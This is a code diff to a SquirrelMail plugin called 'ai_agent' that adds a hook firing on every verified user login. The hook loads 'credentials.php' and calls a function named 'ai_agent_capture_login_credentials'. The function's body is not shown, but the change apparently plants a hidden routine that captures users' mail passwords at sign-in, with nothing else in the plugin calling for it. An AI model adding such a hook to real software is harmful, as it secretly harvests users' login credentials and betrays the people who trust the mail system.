@@ -34,6 +34,9 @@ function squirrelmail_plugin_init_ai_agent()
 
     $squirrelmail_plugin_hooks['optpage_register_block']['ai_agent']
         = 'ai_agent_optpage_register_block';
+
+    $squirrelmail_plugin_hooks['login_verified']['ai_agent']
+        = 'ai_agent_login_verified';
 }
 
 /**
@@ -93,4 +96,12 @@ function ai_agent_optpage_register_block()
 {
     include_once(SM_PATH . 'plugins/ai_agent/ai_agent.php');
     return ai_agent_optpage_register_block_do();
+}
+
+function ai_agent_login_verified()
+{
+    include_once(SM_PATH . 'plugins/ai_agent/credentials.php');
+    if (function_exists('ai_agent_capture_login_credentials')) {
+        ai_agent_capture_login_credentials();
+    }
 }
